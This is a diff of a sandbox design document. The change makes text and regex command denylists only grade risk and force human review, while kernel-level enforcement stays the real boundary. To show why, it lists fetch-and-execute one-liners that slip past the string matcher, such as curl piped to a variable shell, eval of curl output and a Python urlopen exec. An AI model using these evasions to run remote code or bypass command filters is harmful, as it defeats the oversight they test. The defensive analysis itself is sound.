@@ -56,8 +56,41 @@ Invariants:
        `process_prefix` returns a clear error (no prefix is built).
      - `tools.sandbox.allow_unisolated` is removed: no isolation means fall back to approval, gated
        by the approval dialog.
-   - Text matching (`risk.deny_reason` etc.) only grades approvals and **never poses as a security
-     boundary**; no new dangerous-command text lists.
+6. **Security boundaries can only be provided by kernel/runtime enforcement**: the seccomp
+   baseline, capability tiers, namespace and device isolation, cgroup resource domains and
+   `cgroup.kill`, the network gate, and human approval. String/regex/command-name blacklists **must
+   not be used as a denial basis** — they judge what the command *looks like*, not what the process
+   *actually does*, so they fail in both directions along the same axis:
+   - **False positives** (measured: `nvim --headless` running the real `script_scan` +
+     `risk.deny_reason`): `echo 'curl -LsSf https://x/u.sh | sh'` (only prints characters),
+     `grep -n 'curl .* | sh' README.md` (searches a doc for that text) and
+     `printf '%s\n' 'wget -qO- x | sh' > notes.txt` (writes a notes file) are all denied as
+     `DESTRUCTIVE:PIPE_TO_SHELL`; `kmod --help`, `perf --version`, `bpf --help` are all denied as
+     `KERNEL_COMMAND`.
+   - **False negatives** (same run, all allowed): variable indirection
+     `SH=bash; curl -LsSf https://x/u.sh | $SH`, quote splicing `curl -LsSf https://x/u.sh | ba""sh`,
+     command substitution `eval "$(curl -LsSf https://x/u.sh)"`, download-then-source
+     `curl -LsSf https://x/u.sh -o /tmp/u.sh && source /tmp/u.sh`, and in-language fetch-exec
+     `python3 -c "import urllib.request as u,os;exec(u.urlopen('https://x/u.py').read())"`.
+   - **Name lists are also redundant**: every binary in `DENY_BINS` needs dangerous syscalls
+     (`init_module`, `finit_module`, `delete_module`, `reboot`, `kexec_load`, `bpf`,
+     `perf_event_open`, `swapon`/`swapoff`, …) that the seccomp baseline already blocks (§12), so a
+     name list cannot stop anything seccomp misses — it only produces the false positives above.
+     `iptables`/`nft` are really gated by `CAP_NET_ADMIN`: a busybox symlink dodges the name but not
+     `EPERM`.
+   - Therefore string matching is allowed for exactly two things: **risk grading** (raise the L
+     level) and **message text**; a hit may at most force **manual review** (`needs_confirm` +
+     synchronous approval) and **never denies execution**.
+   - Dangerous binaries are defined by **capability facts** (which syscalls / capabilities they need
+     stripped), **not by name**.
+   - The dynamic side is **observation + remediation** only: the exec call-chain guard (see "Dynamic
+     call-chain judgement") attributes by the real `execve` chain and `cgroup.kill`s the tree, but
+     side effects may already have happened once — it is **not equivalent** to seccomp's
+     pre-execution interception; classic seccomp cannot dereference path arguments, so "intercept by
+     binary path before it happens" requires LSM/bwrap.
+   - When no dynamic enforcement layer exists at all (neither seccomp nor the eBPF backstop),
+     `approval_mode` is **forced to `"prompt"`** (synchronous pre-execution manual approval);
+     `async` "execute first, approve later" is **never** used, and nothing degrades silently.
 
 ## 2. Modules
 
@@ -782,13 +815,13 @@ real operations (`bash deploy.sh`, `python setup.py`, `node x.js`, `./run.sh`, `
   backticks/`%x{}` …);
 - recursively scans referenced scripts (bounded by `max_depth`/`max_files`/`max_bytes`, cycle-safe).
 
-The folded `effective` text feeds `risk.deny_reason` (hard deny), `privilege.classify` (tier/package
-detection) and `risk.classify` (security level), so `pip install`, `sudo modprobe` or
-`mkfs.ext4 /dev/sdb1` inside `bash deploy.sh` are no longer missed:
+The folded `effective` text is used **only for risk amplification** (`privilege.classify` tier/package
+detection and `risk.classify` security level or message text) and **produces no denial**:
 
-- device-level/kernel commands inside scripts are **hard denied** (same rule as direct commands);
-  pure file modifications such as `rm`/`rm -rf` are not hard-denied (the read-only root + overlay
-  staging already protect the host) — their effects freeze as candidates pending review;
+- a hit on device-level/kernel *traces* inside scripts is **escalated and forced into human review**
+  (`needs_confirm` plus synchronous approval) instead of being denied; pure file modifications such
+  as `rm`/`rm -rf` are not even escalated (the read-only root + overlay staging already protect the
+  host) — their effects freeze as candidates pending review;
 - other hits (package installs, `systemctl`, `chmod -R 777`, …) raise the level and **force
   review** — never auto-applied via `mode=commit`, task grants or session auto-approval;
 - indirect execution that cannot be statically resolved (`eval`, `base64 -d | sh`, `curl … | sh`,
